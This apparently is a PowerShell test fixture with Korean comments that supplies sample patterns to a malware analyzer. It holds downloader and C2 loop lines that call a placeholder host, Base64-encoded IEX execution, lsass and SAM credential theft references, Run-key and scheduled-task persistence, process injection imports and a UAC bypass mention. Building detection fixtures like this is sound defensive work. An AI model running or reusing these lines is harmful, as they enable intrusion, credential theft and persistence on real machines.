# [ANALYZER TEST FIXTURE] — 실제 실행 시 아무것도 하지 않음
# 분석기 동작 검증용 패턴 모음. 모든 악성 코드 경로는 return으로 차단됨.

return  # <- 여기서 스크립트 종료. 아래 코드는 절대 실행되지 않음.

# ── 패턴 1: PowerShell 다운로더 ──────────────────────────────────────────
$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadString("http://192.0.2.1/payload.ps1")  # TEST-NET: 실제 없는 주소
Invoke-WebRequest -Uri "http://192.0.2.1/stage2.exe" -OutFile "$env:TEMP\s2.exe"

# ── 패턴 2: 난독화 실행 (IEX + Base64) ───────────────────────────────────
$enc = [System.Convert]::FromBase64String(
    "dABlAHMAdAAgAHAAYQB5AGwAbwBhAGQAIABmAG8AcgAgAGEAbgBhAGwAeQB6AGUAcgA="
)
$cmd = [System.Text.Encoding]::Unicode.GetString($enc)
IEX($cmd)
Invoke-Expression($payload)

# ── 패턴 3: 자격증명 탈취 키워드 ─────────────────────────────────────────
# sekurlsa::logonpasswords
# lsass dump via procdump
$lsassDump = "C:\Windows\Temp\lsass.dmp"
$credPath   = "HKLM:\SAM\SAM\Domains\Account"

# ── 패턴 4: 지속성 설치 ───────────────────────────────────────────────────
$regRun = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regRun -Name "Updater" -Value "C:\Temp\payload.exe"
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\payload.exe" /sc onlogon /f

# ── 패턴 5: 프로세스 인젝션 API 참조 ─────────────────────────────────────
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool   WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint n, out uint w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
}
"@

# ── 패턴 6: C2 통신 루프 ─────────────────────────────────────────────────
while ($true) {
    $resp = (New-Object Net.WebClient).DownloadString("http://192.0.2.1/cmd")
    Invoke-Expression $resp
    Start-Sleep -Seconds 60
}

# ── 패턴 7: 정찰 / 시스템 열거 ───────────────────────────────────────────
whoami /all
ipconfig /all
netstat -ano
systeminfo
Get-Process | Where-Object { $_.Name -like "*defender*" }

# ── 패턴 8: 난독화 변수명 + 유니코드 이스케이프 ──────────────────────────
$aB3dEf7gH2iJ = "Invoke-Expression"
$xK9mNp4qRs1t = [scriptblock]::Create($aB3dEf7gH2iJ)

# ── 패턴 9: 권한 상승 ────────────────────────────────────────────────────
Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -Command `"$cmd`""
# UAC bypass via fodhelper
